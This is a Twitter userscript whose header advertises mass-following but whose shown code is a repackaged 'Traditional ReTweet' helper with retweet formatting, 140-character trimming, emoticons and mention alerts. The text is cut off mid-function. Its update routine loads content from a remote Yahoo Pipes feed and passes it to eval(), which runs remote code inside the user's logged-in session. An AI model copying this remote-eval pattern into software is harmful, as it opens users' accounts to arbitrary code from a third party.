// ==UserScript==
// @name       Twitter mass follow someone's follwers/followings
// @namespace  http://www.yehabesha.com/
// @version    0.1
// @description  Twitter mass follow someone's follwers/followings
// @match          http://twitter.com/*
// @match          https://twitter.com/*
// @copyright  2013+, Yonas Abate www.facebook.com/yoniyehabesha or twitter @yehabeshadotcom
// ==/UserScript==

// Inserts javascript that will be called by the autoCheckOrderButton

function insertAfter(node,after){after.parentNode.insertBefore(node,after.nextSibling)}
function g(id){if(id && typeof id==='string'){id=document.getElementById(id);}return id||null;}
function c1(q,root){return document.evaluate(q,root?root:document,null,9,null).singleNodeValue;}
function c2(_q,_el){
  var res=[];var el,els=document.evaluate(_q,_el?_el:document,null,XPathResult.UNORDERED_NODE_ITERATOR_TYPE,null);
  while (el=els.iterateNext())res.push(el);if (res.length) return res; return false;
}

const yodUpdate = {
  script_id : 89405,
  script_version : '3.3',
  script_pipeId : '7015d15962d94b26823e801048aae95d',
}

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function o_debug(str) {
  if (!debug) return;
  console.log(str);
}

function usoUpdate(el) {
  const s_CheckUpdate = 'YodCheckUpdate' + yodUpdate['script_id'];
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  var NeedCheckUpdate = false;
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(s_CheckUpdate)) {
        var s_gm = document.createElement('script');
        s_gm.id = s_CheckUpdate;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function go' + s_CheckUpdate + '(itm){if(itm.value.items.length){return eval(unescape(itm.value.items[0].content).replace(/&lt;/g,\'<\').replace(/&gt;/g,\'>\').replace(/&amp;/g,\'&\'));}}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      var sSrc = 'http://pipes.yahoo.com/pipes/pipe.run?_id=' + yodUpdate['script_pipeId'];
      sSrc += '&_render=json&_callback=go' + s_CheckUpdate;
      sSrc += '&id=' + yodUpdate['script_id'] + '&ver=' + yodUpdate['script_version'];
      //sSrc += '&redir=yes';
      s_gm.src = sSrc;
      el.appendChild(s_gm);

      NeedCheckUpdate = true;
    }
  }
  else {
    setValue(s_CheckUpdate, md);
  }

  return NeedCheckUpdate;
}

function addslashes(str) {
  return str.replace(/\\/g,'\\\\').replace(/\'/g,'\\\'').replace(/\"/g,'\\"').replace(/\0/g,'\\0');
}
function stripslashes(str) {
  return str.replace(/\\'/g,'\'').replace(/\\"/g,'"').replace(/\\0/g,'\0').replace(/\\\\/g,'\\');
}

function ytrim(s) {
  var str = '';
  if (!(str = s.toString().trim())) return str;
  var lines = str.replace(/^\s+|\s+$/g, '').split(/\s*\n\s*/);
  str = lines.join(' ').replace(/[\s]{2,}/g, ' ');
  return str;
}

function hasClass(el, cn) {
  try {cn2 = el.className;} catch (err) {return;}
  return (cn2 + " ").indexOf(cn) >= 0;
}

function yodFindParent(el, c, x) {
  var cc, is_class = (x.match(/class/i)) ? true : false;
  var par = el;
  try {cc = (is_class ? par.className : par.id).toString();}
  catch (err) {cc = "";}
  i = 10;
  var pattcontent = new RegExp(c, "gmi");
  while (i--) {
    try {
      if (cc.match(pattcontent)) {break;}
      par = par.parentNode;
      cc = (is_class ? par.className : par.id).toString();
    }
    catch (err) {continue;}
  }
  return par;
}

function addCS(str, id, css, link) {
  if (g(id)) return;
  var heads = document.getElementsByTagName("head");
  if (heads.length > 0) {
    var node = document.createElement(css ? "style" : "script");
    if (id) node.id = id;
    node.type = css ? "text/css" : "text/javascript";
    if (link) node.src = str;
    else node.appendChild(document.createTextNode(str));
    heads[0].appendChild(node);
  }
}

function appendRunJS(fn) {
  var JSGlobal = "";
  var i = 0; do {
    JSGlobal += fn[i++].toString().replace(/^(function+)\s(\w+)(?=\W|\s)/i, '$2=$1') + "\n";
  }
  while (i < fn.length);
  addCS(JSGlobal, "yod_TradRT_Global");
}

function doyodGetBoolOpt(val, def) {
  var str = getValue(val);
  if (typeof str !== "string") {
    str = "";
    if (def) str = def;
    setValue(val, str);
  }
  return parseInt(str);
}

function doyodGetStrOpt(val, def) {
  var str = getValue(val);
  if (typeof str !== "string") str = "";
  str = str.trim();
  if (str.toString() === "?") return "";
  if (!str && def) str = def + "";
  return str.trim();
}

function yod_doRT(screen_name, content, id) {
  //return function (e) {
    var gmbinder, s_gm = document.createElement('script');
    var s_gmbinder = 'yodgmbinder';
    var pattcontent = new RegExp("@" + my_screen_name, "gmi");
    content = escape(ytrim(deEntity(unescape(content))).replace(pattcontent, my_screen_name));
    s_gm.type = 'text/javascript'; s_gm.id = s_gmbinder;
    s_gm.innerHTML = "if (e=$('#"+id+"').find('.cancel-action, .js-prompt-cancel')) e.click(); yodShowTweetBox('" + escape(ytrim(deEntity(unescape(screen_name)))) + "','" + content + "%yod%', '" + valRT + "');";
    document.body.appendChild(s_gm);
    doyodRTFit140(true);
    setTimeout(function(){
      if (gmbinder = g(s_gmbinder)) {
        document.body.removeChild(gmbinder);
      }
    }, 1000);
  //}
}

function inject_button(target, link) {
  var target2 = c1('.//ul[contains(@class,"dropdown-menu")]', target.parentNode);
  var b = document.createTextNode(link._label);

  var span = document.createElement('span');
  span.appendChild(b); //label

  var a = document.createElement('a');
  a.setAttribute('href', 'javascript:void(0);'); a.setAttribute('title', link._title); a.className = "yodInjButt";
  if (link._class) a.className += " " + link._class;
  if (link._click) a.addEventListener('click', link._click, false);
  a.appendChild(span);

  var a2 = document.createElement('li');
  a2.appendChild(a);

  if (!target2) {
      if (!(target2 = c1('.//ul[contains(@class,"yodRTUL")]', target.parentNode))) {
      var target2 = document.createElement('ul');
      target2.className = "yodRTUL";
      target.parentNode.appendChild(target2);
    }
  }

  if (target2) target2.appendChild(a2);
}

function expand_link(el) {
  var links = c2('.//a[@data-expanded-url]', el);
  for (a in links) {
    var a1 = links[a].getAttribute('data-ultimate-url');
    var a2 = links[a].getAttribute('data-expanded-url');
    if (a1 || a2) links[a].innerHTML = a1 ? a1 : a2;
  }
}

function deEntity(str) {
  return str.replace(/<\/?[^>]+>/gi, '')
  .replace(/&lt;/gi, '<')
  .replace(/&gt;/gi, '>')
  .replace(/&amp;/gi, '&')
  .replace(/&quot;/gi, '"')/*
  .replace(/&#39;/gi, '\'')
  .replace(/"/gi, '')*/;
}

function translate_link(tt, shortlink) {
  var is_entity = tt.textContent.match(/(&lt|&gt|&amp|&quot|#[0-9]);/gi) ? true : false;
  yodRTDiv.innerHTML = tt.innerHTML;
  // collect links
  var links = c2(".//a[@data-expanded-url]", yodRTDiv);
  for (i=0; i<links.length; i++) {
    var link = links[i];
    var a1 = link.getAttribute('data-ultimate-url');
    var a2 = link.getAttribute('data-expanded-url');
    if (longURL = a1 || a2) {
      var newLink = document.createTextNode(shortlink? link.href : longURL);
      link.parentNode.replaceChild(newLink, link);
      link.href = longURL;
    }
  }

  var c = deEntity(unescape(yodRTDiv.innerHTML));
  yodRTDiv.innerHTML = "";
  if (is_entity) {
    tt.innerHTML = c;
    //o_debug(tt.textContent);
  }
  return c;
}

function translate_link2(tt) {
  if (hasClass(tt, "yodDone2")) return;
    tt.className += " yodDone2";
    // collect links
    var links = c2('.//a[@data-expanded-url and not(contains(@class,"yodDone3"))]', tt);
    for (var i in links) {
      var link = links[i];
        setTimeout(function(){
          if (hasClass(link, "yodDone3")) return;
          var a1 = link.getAttribute('data-ultimate-url');
          var a2 = link.getAttribute('data-expanded-url');
          //o_debug(a2+' -> '+a1);
          if (a2) link.className += " yodDone3";
          if (longURL = a1 || a2) {
            link.href = link.title = longURL;
          }
        }, 2000);
    }
}
/*
function facebookShare(url, txt, ava) {
  var title = summary = encodeURIComponent(txt.replace(/[\r\n]/, " ").replace(/\s{2,}/g, " "));
  var facebookLink = "http://www.facebook.com/sharer.php?s=100";
  var tl = '&p[title]='+title;
  var strUrl = '&p[url]='+encodeURIComponent(url);
  var strSummary = '&p[summary]='+summary;
  var stImage = "";
  if (ava) stImage = '&p[images][0]='+encodeURIComponent(ava);
  var shareUrl = facebookLink+tl+strUrl+strSummary+stImage;
  window.open(shareUrl);
}
*/
function compareDate(e) {
  key = "data_item_id";
  try {data_item_id = e.getAttribute('data-item-id');} catch (err) {data_item_id = 0;}
  if (!data_item_id) return;
  val = doyodGetBoolOpt(key, 1);
  if (data_item_id > val) {
    setValue(key, data_item_id);
    return true;
  }
}

function yod_make_RT2(e) {
  if (!(entry =
    c1('.//div[contains(@class,"js-stream-tweet")]', e)
    || c1('.//div[contains(@class,"twttr-dialog-content")]', e)
  )) return;

  if (!(yodRTDiv = c1('.//div[contains(@id,"yodRTDiv")]'))) return;

  var tt;
  if (!(tt = (
      c1('.//p[contains(@class,"js-tweet-text")]', entry) ||
      c1('.//div[contains(@class,"tweet-text")]', entry)
    ))) return;

  // screen name
  var screen_name;
  if (multi_tweet = c1('.//div[contains(@class,"stream-item-content")]', entry)) {
    screen_name = multi_tweet.getAttribute('data-screen-name');
  } else { //tweet
    if (tweet = entry) {
      screen_name = tweet.getAttribute('data-screen-name');
    }
  }

  if (!screen_name) {
    if (screen_name = c1('.//span[contains(@class,"twttr-reply-screenname")]', tt.parentNode))
      screen_name = screen_name.textContent;
  }

  // RT text
  var content = translate_link(tt);

  if (!screen_name || !content) return;

  return yod_doRT(screen_name, content, e.id);
}

function yod_make_RT(entry, newtweet) {
  if (hasClass(entry, "yodDone")) return;

  var img, ava;
  if (img = c1('.//img[contains(@class,"js-action-profile-avatar")]', entry)) {
    ava = img.src;
  }

  if (!hasClass(entry, "yodDone2")) {
    if (newtweet) newtweet = compareDate(entry);
    if (newtweet) {
      var data_mentions = entry.getAttribute('data-mentions') || "";
      //o_debug(data_mentions);

      var pattcontent = new RegExp("\s?" + my_screen_name + "\s?", "gm");
      if (data_mentions.match(pattcontent)) {
        els = c2('.//*[contains(@class,"forme")]');
        for (var a in els) {
          if (e = els[a])
            e.className = e.className.replace(/forme/gm, '');
        }
        playsound();
        valMarkMention = doyodGetBoolOpt("yodMarkMention");
        if (valMarkMention) entry.className += "forme";
      }
    }

    entry.addEventListener('DOMSubtreeModified', function () {
      translate_link2(entry);
    }, false);
  }

  // add parsed class
  entry.className += " yodDone";
/*
  // RT text
  var content = translate_link(tt);

  var link = {
    _class: 'yod-old-style-retweet',
    _click: yod_doRT(screen_name, content),
    _label: '#[RT]',
    _title: 'Traditional ReTweet'
  };

  inject_button(target, link);

  // Re RT text
  var content = translate_link(tt, true);

  // FB Share
  var fbURL, fbTitle = 'Twitter @' + screen_name + ' ; ' + content.trim();

  if (fbURL = (
    c1('.//a[contains(@class,"tweet-timestamp")]', entry) ||
    c1('.//a[contains(@class,"embed-link")]', entry) ||
    c1('.//a[contains(@class,"js-open-close-tweet")]', entry)
  )) {
    var fbURL1 = fbURL.href.replace(/\/#!/, '').replace(/\/embed$/, '');

    var link = {
      //_click: function(){window.open(fbURL1)},
      _click: function(){facebookShare(fbURL1, fbTitle, ava);return false;},
      _label: '#[FB]',
      _title: 'Facebook Share'
    };

    inject_button(target, link);
  }*/
}

function attachScroll(div, title, xchar, fn) {
  var el = document.createElement('div');
  el.textContent = xchar;
  el.setAttribute('style', 'height: 15px; width: 10px; float:left;');
  el.setAttribute('title', 'Scroll page to ' + title);
  el.addEventListener("click", fn, false);
  div.appendChild(el);
}

function doAdvTop() {
  if (logo = g("logo") || g("global-actions")) {
    div = document.createElement('div');
    div.id = 'yodAdvTop';
    var sClass = 'Hide';
    if (valAdvTop) {
      sClass = 'Show';
    }
    div.className = 'yod' + sClass;
    attachScroll(div, 'Top', '\u25B2', function(){scroll(0, 0);});
    attachScroll(div, 'Bottom', '\u25BC', function(){scroll(0, document.body.scrollHeight);});
    insertAfter(div, logo);

    // Extract DM
    if (dm = c1('.//a[contains(@class,"js-dm-dialog")]/span')) {
      var el = document.createElement('div');
      el.id = "yodmsg";
      el.innerHTML = dm.innerHTML;
      dm.addEventListener("DOMSubtreeModified", yod_extDM, true);
      insertAfter(el, div);
    }
  }
}

var yod_runScript_RT = function() {
  //var $;

  if (typeof jQuery !== 'undefined') {
    $ = jQuery;
  } else {
    using("core/jquery", function(x){$=x});
  }


  yodGetTweetBox = function() {
    return $("#yod_TweetBox");
  }

  yodcleanSpace = function(txt) {
    return txt.replace(/[\r\n]/, " ").replace(/\s{2,}/g, " ").trim();
  }

  yodHailTweetBox = function(txa, txt) {
    if (txa = $("#"+txa).parent()) {
      if (!(txa = txa.find('.rich-editor'))) return;
      txa.focus().change();
      if (txt) txa.html(yodcleanSpace(deEntity(unescape(txt))));
      txa.focus().change();
    }
  }

  yodShowTweetBox = function(s,c,yodrt) {
    var content = "@" + s + ": " + yodcleanSpace(deEntity(unescape(c))).replace(/%yod%/ig, "");
    try {
      if (typeof twttr !== 'undefined') {
        new twttr.widget.TweetDialog({
          draggable:true,
          defaultContent:content,
          origin:"yod-Traditional-RT",
          template:{title:_("ReTweet @"+s+" (Trad. ReTweet)")}
        }).open().focus().change();

        setTimeout(function() {
          if (txa = yodGetTweetBox()) {
            txa.val(yodrt + " " + txa.val());
            yodHailTweetBox();
          }
        }, 3);
        return;
      }
    } catch(err) {}

    if (nt = $("#global-new-tweet-button")) {
      nt.click();

      var txa = $("#global-tweet-dialog .tweet-box:visible, #tweet_dialog .twitter-anywhere-tweet-box-editor:visible");
      //var txa = yodGetTweetBox();
      //txa.val(yodrt + " " + content);
      txa.html(yodrt + " " + content).change();
      yodHailTweetBox();
/*
      setTimeout(function() {
        txa.get(0).setSelectionRange(0, 0);
      }, 3);*/
    }
  }

  yodInsSmiley = function(el, text) {
    var txa;
    if (!(txa = yodGetTweetBox())) txa = $("#"+el);
    if (!txa) return false;
    if (!(txb = txa.get(0))) return false;
    if (txb.tagName !== "TEXTAREA") return false;
    if (text && txa) {
      var txt = " " + deEntity(unescape(text)) + " ";/*
      if (txb.selectionStart || txb.selectionStart == "0") {
        var startPos = txb.selectionStart; var endPos = txb.selectionEnd; var scrollTop = txb.scrollTop;
        txb.value = txb.value.substring(0, startPos) + txt + txb.value.substring(endPos, txb.value.length);
        txa.focus().change();
        txb.selectionStart = startPos + txt.length; txb.selectionEnd = startPos + txt.length;
        txb.scrollTop = scrollTop;
        yodHailTweetBox(txb.id);
      }*/

      if (!(txa = checkWrap(txb))) return;//alert(txa.innerHTML);
      txa.focus();
      document.execCommand('insertText', false, txt);
      return false;
    }
  }

  expandNewTweet = function(text) {
    if (typeof $ !== 'undefined') {
      $(text).click();
    }
  }
}

function starter() {
  if (g("yod_RT_CSS")) return;

  doAdvTop();

  appendRunJS([c1, checkWrap, deEntity]);
  addCS("(" + yod_runScript_RT + ")();", "yodShowTweetBoxHeaderScript");

  const mycss = "\
.yodInjButt{margin-left: 5px!important;}\
.dm-dialog .twttr-dialog-inside, .dm-tweetbox {height:auto!important;}\
.dm-dialog .dm-tweetbox .tweet-box {padding: 0!important;height:auto!important;}\
.yodLegend legend{margin:auto!important;line-height:inherit!important;font-size:12px!important;font-weight:bold!important;text-align: center!important; padding: 0 5px!important; width: auto!important;border:none !important;}\
.yodLegend fieldset{border:none;}\
.yodLegend .tablex{font-size:11px!important;margin: 5px auto; width: 98%;}\
.yodLegend .tablex ul {text-align: center;}\
.yodLegend ul:not(:last-child) {margin-bottom:10px!important;}\
.yodLegend .tablex li {display: inline-block;cursor:pointer!important;min-width:15%;padding: 2px 0;}\
.yodLegend .tablex li:hover {font-size: 20px;font-weight: bold;}\
.yodLegend .tablex > div {display: inline-table; margin-right:5px}\
.yodLegend input {margin-right:5px;}\
.yodLegend label{margin:0!important;}\
.yodShow {display: block !important;}\
.yodHide {display: none !important;}\
.fShow {border-top:solid 1px #CCC !important;}\
.fHide {}\
#yodRTFit140Auto{margin-bottom: -5px;}\
#yodSpace{padding: 10px 20px 20px;text-align: center}\
#yodSpace > div:not(:first-child) {margin-top:10px}\
#yodSpace * {cursor:pointer}\
#yodSpace .btn {padding:2px 5px!important}\
#yodRTCopyLeft{font-size:11px; text-align: center;border-top: 1px solid #CCC;}\
#yodRTOption > div {display: inline-table; margin-right:5px}\
#ip_yodRTOpt_RTTxt {border:1px solid #CCC!important;width:50px!important;padding:0 3px!important}\
#yodRTDiv{display:none;overflow:hidden;}\
#yodmsg > span {\
font-weight: bold;float: right;min-width: 7px;padding: 0 9px;color: white;background-color: #58B3F0; margin:10px auto; border-radius: 9px;}\
span.geo-text{width:auto!important;}\
#yod_tw_id2 {background-color:black;color:white;padding:2px;}\
#yod_tw_id {color:red;}\
.yodSpace_ireply{padding: 5px 0 10px;}\
.yodSpace_ireply_wrapper{text-align: center;}\
.yodSpace_ireply_wrapper > div {display:inline-table;margin: 0 2px;}\
.forme {background-color: rgba(255,255,0,.3);}\
#yodAdvTop{color:#FFF;width: 10px; margin: 5px auto; padding-right: 5px; cursor: pointer; float: left;}\
.yodRTUL {float: left; margin-right: 10px;}\
.yodRTUL, .yodRTUL li {display: inline;}\
.permalink-tweet .yodRTUL {margin-top: 8px;}\
.btn.yod-rt{float:left!important;}\
";

  addCS(mycss, "yod_RT_CSS", 1);

  //create Slave
  yodRTDiv = document.createElement('div');
  yodRTDiv.id = 'yodRTDiv';
  document.body.appendChild(yodRTDiv);

  setTimeout(function() {
    if (el = c1('.//div[contains(@class,"permalink-tweet-container")]')) {
      watchreply(el);
    }
    yod_render(1);
  }, 5000);
}

function yod_render(newtweet) {
  els = c2('.//div[contains(@class,"js-actionable-tweet") and not(contains(@class,"yodDone"))]');
  for (a in els) {
    yod_make_RT(els[a], newtweet);
  }

  if (debug && (yod_frun <= 0)) {
    s = c1('.//div[contains(@class,"profile-card-inner")]');
    if (s && !(g('yod_tw_id'))) {
      if (tw_id = s.getAttribute('data-user-id')) {
        p = document.createElement('div');
        p.id = 'yod_tw_id';
        p.innerHTML = tw_id;
        s.appendChild(p);
      }
    }
  }
}

function yod_extDM(e) {
  var el, el2, yodmsg;
  if (el = e.currentTarget) {
    if (yodmsg = g("yodmsg")) {
      el2 = parseInt(el.textContent) || 0;
      yodmsg.innerHTML = "";
      yodmsg.appendChild(el.cloneNode(true));
      if (hasClass(yodmsg, "yodDone")) {
        yodmsg.className = "";
      }
      else {
        yodmsg.className += " yodDone";
        if (el2 && (parseInt(countMsg) < el2)) playsound();
        countMsg = el2;
      }
    }
  }
}

function GetTxtBox() {
  return g('yod_TweetBox') || c1('.//textarea[contains(@class,"tweet-box-")]');
}

function HailTxtBox(id, txt) {
  var s_gm_counter = 'gm_counter';
  if (gm_counter = g(s_gm_counter)) {
    document.head.removeChild(gm_counter);
  }
  if (!id) id = "";
  if (!txt) txt = "";
  addCS('yodHailTweetBox(\'' + id + '\', \'' + escape(txt) + '\');', s_gm_counter);
}

function doyodRTClean(all,txt) {
  var txt2 = "";
  if (!txt) txt = GetTxtBox();
  else txt2 = txt.id;
  if (txt.tagName === "TEXTAREA") {
    if (!(txt = checkWrap(txt))) return;
    if (all) txt.innerHTML = "";
    else txt.innerHTML = txt.textContent.trim().replace(/\s{2,}/g, " ");
    //txt.focus().change();
    HailTxtBox(txt2);
  }
}

function doyodRTFit140(f,txt) {
  var txt2 = "";
  if (!txt) txt = GetTxtBox();
  else txt2 = txt.id;
  if (txt.tagName === "TEXTAREA") {
    if (!(txt = checkWrap(txt))) return;
    txt.innerHTML = txt.textContent.trim().replace(/\s{2,}/g, " ").replace(/%yod%/ig, "");
    if (doyodGetBoolOpt("yodRT_auto140")) f = false;
    if (!f && (txt.textContent.length > 140)) {
      txt.textContent = txt.textContent.substr(0, 138) + "..";
    }
    HailTxtBox(txt2);
  }
  return false;
}

function toggleShow(el, id) {
  var sClass = 'Hide'; var state = 0;
  if (el.className.match(/yodHide/)) {
    sClass = 'Show'; state++;
  }
  setValue(id, state);
  el.parentNode.className = 'f' + sClass;
  el.className = el.className.replace(/(yodHide|yodShow)/, 'yod' + sClass);
}

function buildEmoTable(id, arr) {
  var i, em, str = '<ul>';
  for (i in arr) {
    if (em = arr[i].trim()) {
      str += '<li onclick="javascript:yodInsSmiley(\''+id+'\', \'' + escape(em) + '\');return false;">' + em + '</li>';
    }
  }
  str += '</ul>';
  return str;
}


function checkWrap(t) {
  if (!t) return;
  return c1('.//div[contains(@class,"rich-editor")]', t.parentNode);
}

function updateTxa(id, s) {/*
  var txai = g(id);
  var txt = txai.value.replace(/^(reply[^@]+)/i, "").trim();
  txt = txt + ": " + s.trim();
  HailTxtBox(id, txt);*/
  var txai = g(id);
  if (!(txai = checkWrap(txai))) return;
  txai.innerHTML = txai.textContent;
  var txt = txai.innerHTML.replace(/^(reply[^@]+)/i, "").trim();
  txt = txt + " " + s.trim();
  HailTxtBox(id, txt);
}

function watchreply(e) {
  var e = e.currentTarget || e;
  var e = e.parentNode;
  if (c1('.//div[contains(@class,"yodSpace_ireply")]', e)) return;
  if (!(txa = c1('.//*[contains(@id,"tweet-box-reply")]', e))) return;
  if (!(target = yodFindParent(txa, 'inline-reply', 'class'))) return;
  if (!(y = yodFindParent(target, 'expansion', 'class')))
    if (!(y = yodFindParent(target, 'permalink', 'class'))) return;

  var tmp, elwrs, elwr, p_t, p = y.cloneNode(true);
  if (!(elwrs = c2('.//*[contains(@class,"tweet-text")]', p))) return;

  for (i in elwrs) {
    if (!(
      hasClass(elwrs[i].parentNode, "opened-tweet") ||
      hasClass(elwrs[i].parentNode.parentNode, "opened-tweet"))
    ) continue;
    elwr = elwrs[i];
  }

  //if (elwr = c1('.//*[contains(@class,"js-tweet-text")]', p)) {
  if (elwr) {
    setTimeout(function(){
      if (txa = checkWrap(txa))
        txa.textContent += ":";
    }, 500);

    expand_link(elwr);

    var div = document.createElement("div");
    div.className = "yodSpace_ireply";
    var div2 = document.createElement("div");
    div2.className = "yodSpace_ireply_wrapper";

    // Fit 140 - Cut Text to 140 char length
    var a = document.createElement("a");
    a.setAttribute('data-target', txa.id);
    a.innerHTML = 'Fit 140'; a.className = 'btn'; a.id = "yodRTFit140";
    a.setAttribute('href', 'javascript:void(0);'); a.setAttribute('title', "Fit 140");
    a.addEventListener('click', function(){
      doyodRTFit140(false, g(this.getAttribute('data-target')));
      return false;
    }, false);
    var div3 = document.createElement("div");
    div3.appendChild(a); div2.appendChild(div3);

    // Clean - freeup space
    var a = document.createElement("a");
    a.setAttribute('data-target', txa.id);
    a.innerHTML = 'Clean'; a.className = 'btn'; a.id = "yodRTClear";
    a.setAttribute('href', 'javascript:void(0);'); a.setAttribute('title', "Free Space Tweet TextBox");
    a.addEventListener('click', function(){
      doyodRTClean(false, g(this.getAttribute('data-target')));
      return false;
    }, false);
    var div3 = document.createElement("div");
    div3.appendChild(a); div2.appendChild(div3);
    div.appendChild(div2);

    var a = document.createElement("a");
    a.className = 'btn'; a.innerHTML = 'Copy Reply';
    a.setAttribute('data-target', txa.id);
    a.setAttribute('href', 'javascript:void(0);'); a.setAttribute('title', "Copy current text reply");
    a.addEventListener('click', function() {
      updateTxa(this.getAttribute('data-target'), elwr.textContent);
      return false;
    }, false);
    var div3 = document.createElement("div");
    div3.appendChild(a); div2.appendChild(div3);

    div.appendChild(div2);
    //p_t.parentNode.insertBefore(div, p_t);
    insertAfter(div, target);
  }
}

function yodInlineReply(e) {
  e.addEventListener("DOMNodeInserted", function(e){watchreply(e);} , true);
}

function yodFindReply(el, rep, txa) {
  if (!(par = yodFindParent(el, 'yodSpace', 'id'))) return;
  var act = "";/*
  if (el = c1('.//span[contains(@class,"name")]', rep)) {
    act = el.textContent.trim();
  }*/
  var p = rep.cloneNode(true);
  if (el = c1('.//*[contains(@class,"js-tweet-text")]', p)) {
    expand_link(el);
    //txa.value += " " + act + ": " + el.textContent.trim();
    if (txa = checkWrap(txa)) {
      txa.innerHTML += ": " + el.textContent.trim();
      if (doyodGetBoolOpt("yodRT_auto140")) doyodRTFit140();
      doyodRTClean();
    }
    return false;
  }
}

function yod_goDiag(e, re) {
  var elx, target, txt;
  elx = re || e.currentTarget;
  if (e2 = c1('.//div[contains(@id,"retweet-dialog")]', elx)) return yod_rtDiag(e, e2);
  if (elx.tagName) {
    if (!(txt = c1('.//textarea', elx))) return false;
    placed = g("yodRTOption");

    // new
    if (!(target = c1('.//div[contains(@class,"modal-body")]', elx)))
      // old
      if (!(target = c1('.//div[contains(@class,"tweet-box")]', elx)))
        return false;

    // new
    if (!(rep = c1('.//div[contains(@class,"modal-footer")]', elx)))
      // old
      rep = c1('.//div[contains(@class,"twttr-dialog-reply-footer")]', elx);

    var vis = "none";
    if (yodRTCopyReply = g("yodRTCopyReply")) {
      if (yodRTCopyReply && rep) {
        if (rep.innerHTML) vis = "inline-table";
      }
      yodRTCopyReply.setAttribute("style", "display:"+vis);
    }

    // Inject Copy Reply button
    if (target && placed && rep/**/ && !g('yodRTCopyReply')) {
      if (!txt) return false;
      var div2 = document.createElement("div");
      div2.id = "yodRTCopyReply";
      var a = document.createElement("a");
      a.className = 'btn'; a.innerHTML = 'Copy Reply';
      a.setAttribute('href', 'javascript:void(0);'); a.setAttribute('title', "Copy current text reply");
      a.addEventListener('click', function(){
        yodFindReply(this, rep, txt);
        return false;
      }, false);
      div2.appendChild(a);
      placed.appendChild(div2);
    }

    if (placed && !g('yod_TweetBox')) {
      txt.id="yod_TweetBox";
    }

    if (placed) return false;

    // Inject Our Space to Target
    if (target) {
      var div = document.createElement("div");
      div.id = "yodSpace";
      var div2 = document.createElement("div");
      div2.id = "yodRTOption";

      // Fit 140 - Cut Text to 140 char length
      var a = document.createElement("a");
      a.innerHTML = 'Fit 140'; a.className = 'btn'; a.id = "yodRTFit140";
      a.setAttribute('href', 'javascript:void(0);'); a.setAttribute('title', "Fit 140");
      a.addEventListener('click', function(){
        doyodRTFit140();
        return false;
      }, false);
      var div3 = document.createElement("div");
      div3.appendChild(a); div2.appendChild(div3);

      // Clear TweetBox
      var a = document.createElement("a");
      a.innerHTML = 'x'; a.className = 'btn'; a.id = "yodRTClear";
      a.setAttribute('href', 'javascript:void(0);'); a.setAttribute('title', "Clear Tweet TextBox");
      a.addEventListener('click', function(){
        doyodRTClean(1);
        return false;
      }, false);
      var div3 = document.createElement("div");
      div3.appendChild(a); div2.appendChild(div3);
      div.appendChild(div2);

      // Clean - freeup space
      var a = document.createElement("a");
      a.innerHTML = 'Clean'; a.className = 'btn'; a.id = "yodRTClean";
      a.setAttribute('href', 'javascript:void(0);'); a.setAttribute('title', "Free Space Tweet TextBox");
      a.addEventListener('click', function(){
        doyodRTClean();
        return false;
      }, false);
      var div3 = document.createElement("div");
      div3.appendChild(a); div2.appendChild(div3);
      div.appendChild(div2);

      // Emoticons Table
      var div2 = document.createElement("div");
      div2.id = "yodRTEmo";
      div2.className = "yodLegend";
      var state = doyodGetBoolOpt(div2.id);
      var v_valEmote = state ? "Show" : "Hide";
      str = '<fieldset class="f' + v_valEmote + '"><legend align="center" title="Toggle Show-Hide">[ Emoticons ]</legend><div class="tablex yod' + v_valEmote + '">';
      str += buildEmoTable(txt.id, symbols);
      str += buildEmoTable(txt.id, symbols_utf);
      str += '</div></fieldset>';
      div2.innerHTML = str;
      div.appendChild(div2);

      // OPTION Table
      var div2 = document.createElement("div");
      div2.id = "yodOPTION";
      div2.className = "yodLegend";
      var state = doyodGetBoolOpt(div2.id);
      var v_valOption = state ? "Show" : "Hide";
      str = '<fieldset class="f' + v_valOption + '"><legend align="center" title="Toggle Show-Hide">[ OPTIONS ]</legend><div class="tablex yod' + v_valOption + '">';

      v_valRT = valRT ? valRT : "?";
      str += '\
      <div id="yodRTTxt"><label title="Opt RT Text ( \'?\' for no Prefix )">RT Text <input id="ip_yodRTOpt_RTTxt" name="ip_yodRTOpt_RTTxt" type="text" value="' + v_valRT + '"></label></div>';

      checked = doyodGetBoolOpt("yodRT_auto140") ? ' checked="checked"' : '';
      str += '\<div><label title="Auto cut 140 char"><input id="cb_yodRTOpt_auto140" name="cb_yodRTOpt_auto140" type="checkbox" ' + checked + '>Auto140</label></div>';

      checked = doyodGetBoolOpt("yodAdvTop") ? ' checked="checked"' : '';
      str += '\<div><label title="Top Nav Scroller"><input id="cb_yodAdvTop" name="cb_yodAdvTop" type="checkbox" ' + checked + '>Top Nav</label></div>';

      checked = doyodGetBoolOpt("yodPlaySound") ? ' checked="checked"' : '';
      str += '\<div><label title="Play Sound on new mention"><input id="cb_yodPlaySound" name="cb_yodPlaySound" type="checkbox" ' + checked + '>Sound</label></div>';

      checked = doyodGetBoolOpt("yodMarkMention") ? ' checked="checked"' : '';
      str += '\<div><label title="Colorize on new mention"><input id="cb_yodMarkMention" name="cb_yodMarkMention" type="checkbox" ' + checked + '>Mark Mention</label></div>';

      str += '</div></fieldset>';
      div2.innerHTML = str;
      div.appendChild(div2);

      // Footer Copyleft
      var div2 = document.createElement("div");
      div2.id = "yodRTCopyLeft";
      div2.innerHTML = '<span class="copyleft">\
      Done by <a href="http://blog.krakenstein.net" target="_blank" title="Dev Blog">Cecek Pawon 2010</a> \
      (<a href="http://twitter.com/cecekpawon" title="Dev Twitter">@cecekpawon</a>) \
      w/ <a href="http://userscripts.org/' + yodUpdate['script_id'] + '" target="_blank" title="Script Page">\
      Traditional ReTweet (v' + yodUpdate['script_version'] + ')</a>\
      </span>';
      div.appendChild(div2);

      insertAfter(div, target);

      // cb_yodPlaySound Events
      if (cb_yodPlaySound = g("cb_yodPlaySound")) {
        cb_yodPlaySound.addEventListener('click', function(){
          setValue("yodPlaySound", this.checked ? 1 : 0);
          return false;
        }, false);
      }

      // cb_yodMarkMention Events
      if (cb_yodMarkMention = g("cb_yodMarkMention")) {
        cb_yodMarkMention.addEventListener('click', function(){
